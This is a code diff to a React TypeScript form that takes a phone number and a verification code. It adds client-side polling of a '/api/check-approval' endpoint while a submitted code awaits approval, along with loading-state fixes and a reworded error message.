@@ -7,6 +7,7 @@ interface FormData {
   phoneNumber: string;
   country: string;
   verificationCode: string;
+  pollId?: string;
 }
 
 function App() {
@@ -14,7 +15,8 @@ function App() {
   const [formData, setFormData] = useState<FormData>({
     phoneNumber: '',
     country: '',
-    verificationCode: ''
+    verificationCode: '',
+    pollId: undefined
   });
   const [loading, setLoading] = useState(false);
   const [result, setResult] = useState<'approved' | 'rejected' | null>(null);
@@ -50,6 +52,7 @@ function App() {
   const handleVerificationSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!formData.verificationCode.trim()) return;
+    if (loading) return;
 
     setLoading(true);
     
@@ -67,13 +70,53 @@ function App() {
 
       const data = await response.json();
       
-      if (data.approved) {
+      if (data.status === 'pending') {
+        // Poll was sent, now we need to wait for approval
+        setFormData(prev => ({ ...prev, pollId: data.pollId }));
+        
+        // Start polling for approval status
+        const checkApproval = async () => {
+          try {
+            const checkResponse = await fetch('/api/check-approval', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json',
+              },
+              body: JSON.stringify({ pollId: data.pollId })
+            });
+            
+            const checkData = await checkResponse.json();
+            
+            if (checkData.status === 'pending') {
+              // Still waiting, check again in 3 seconds
+              setTimeout(checkApproval, 3000);
+            } else {
+              setLoading(false);
+              if (checkData.approved) {
+                setResult('approved');
+              } else {
+                setResult('rejected');
+              }
+              setStep('result');
+            }
+          } catch (error) {
+            console.error('Error checking approval:', error);
+            setLoading(false);
+            setResult('rejected');
+            setStep('result');
+          }
+        };
+        
+        checkApproval();
+      } else if (data.approved) {
         setResult('approved');
+        setStep('result');
+        setLoading(false);
       } else {
         setResult('rejected');
+        setStep('result');
+        setLoading(false);
       }
-      
-      setStep('result');
     } catch (error) {
       console.error('Error verifying code:', error);
       setResult('rejected');
@@ -85,8 +128,9 @@ function App() {
 
   const resetForm = () => {
     setStep('phone');
-    setFormData({ phoneNumber: '', country: '', verificationCode: '' });
+    setFormData({ phoneNumber: '', country: '', verificationCode: '', pollId: undefined });
     setResult(null);
+    setLoading(false);
   };
 
   return (
@@ -207,7 +251,7 @@ function App() {
                       {loading ? (
                         <div className="flex items-center justify-center">
                           <Loader className="w-5 h-5 animate-spin mr-2" />
-                          Verifying...
+                          {formData.pollId ? 'Waiting for approval...' : 'Verifying...'}
                         </div>
                       ) : (
                         'Submit Code'
@@ -240,7 +284,7 @@ function App() {
                       <Shield className="w-10 h-10 text-white" />
                     </div>
                     <h2 className="text-3xl font-bold text-white mb-4">
-                      Wrong code
+                      The code is incorrect
                     </h2>
                     <p className="text-white/80 mb-6">
                       The verification code you entered is incorrect.
